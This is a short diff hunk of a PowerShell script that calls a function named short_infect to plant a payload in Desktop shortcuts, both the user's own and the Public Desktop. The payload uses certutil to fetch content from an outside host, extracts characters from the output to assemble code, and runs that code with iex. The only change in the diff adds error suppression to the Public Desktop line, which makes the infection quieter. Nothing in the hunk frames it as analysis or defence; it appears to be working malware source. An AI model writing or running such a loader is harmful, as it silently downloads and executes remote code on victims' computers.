@@ -46,4 +46,4 @@ ForEach($ShortCut in $StartMenu)
 $desktop_path= $env:USERPROFILE;
 $desktop_path+= "\Desktop";
 short_infect -PathShortcut $desktop_path '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c';
-short_infect -PathShortcut "C:\Users\Public\Desktop" '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c';
+short_infect -PathShortcut "C:\Users\Public\Desktop" '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c';-ErrorAction SilentlyContinue 
